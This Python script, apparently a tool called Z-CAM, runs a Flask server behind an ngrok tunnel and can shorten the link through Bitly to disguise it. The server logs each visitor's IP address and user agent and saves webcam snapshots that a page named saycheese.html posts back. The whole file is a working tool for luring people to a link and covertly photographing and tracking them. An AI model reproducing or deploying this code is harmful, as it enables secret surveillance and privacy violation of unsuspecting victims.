#!/usr/bin/python3

import threading
from flask import Flask, render_template, request 
from datetime import datetime
import base64
import os
import time
from pyngrok import ngrok
import pyfiglet
import logging
import tokensbitly
import pyshorteners

# bitly
ACCESS_TOKEN= tokensbitly.accessToken
s = pyshorteners.Shortener(api_key=ACCESS_TOKEN)

# colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# banner 
result = pyfiglet.figlet_format("Z-CAM")
print(bcolors.OKBLUE + result + bcolors.ENDC)
print("                         "+bcolors.BOLD+"Github: @sankethj"+bcolors.ENDC)
print("")

# disable unwanted logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

os.environ["FLASK_ENV"] = "development"
app = Flask(__name__)
app.debug = False
port = 5000
public_url = ngrok.connect(port).public_url
final_ngrok = public_url[:4] + "s" + public_url[4:]

# url shorten or not
shorten = input(bcolors.WARNING + "Do you want to use Bitly to shorten url link? ['y' or 'n']: " + bcolors.ENDC)
if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
    final_ngrok = s.bitly.short(final_ngrok)
else:
    final_ngrok = final_ngrok


print(" * ngrok tunnel link -> " + bcolors.OKCYAN + final_ngrok + bcolors.ENDC)
app.config["BASE_URL"] = public_url

# flask
@app.route("/",methods=['POST','GET'])
def home():

    # get request
    if request.method == 'GET':
        now = str(datetime.now())
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr

        # writing file
        file1 = open('myfile.txt', 'a')
        file1.write("Date and Time:\t")
        file1.write(str(now))
        file1.write("\nIP:\t")
        file1.write(str(ip_address))
        file1.write("\nUser-Agent:\t")
        file1.write(str(user_agent))
        file1.write("\n\n")
        file1.close()

        print(now+'     '+ bcolors.OKCYAN + ip_address + bcolors.ENDC +'      '+user_agent+'     ')

    # post request
    elif request.method == 'POST':
        now = str(datetime.now())

        # setting path to save file in capture dir
        save_path = 'capture'
        file_name = 'img_'+now+'.png'
        completeName = os.path.join(save_path, file_name)

        # requesting base64 image data 
        req_data = request.get_json() 
        encoded = req_data['canvasData']

        # writing file
        file2 = open(completeName, 'wb')
        data = base64.b64decode(encoded)
        file2.write(data)
        file2.close()
        print(bcolors.OKGREEN + "[" + bcolors.ENDC + "+" + bcolors.OKGREEN + "] Cam image recieved." + bcolors.FAIL + "\n")
    return render_template("saycheese.html")
    
# threading to run flask with pyngrok smoothly
threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()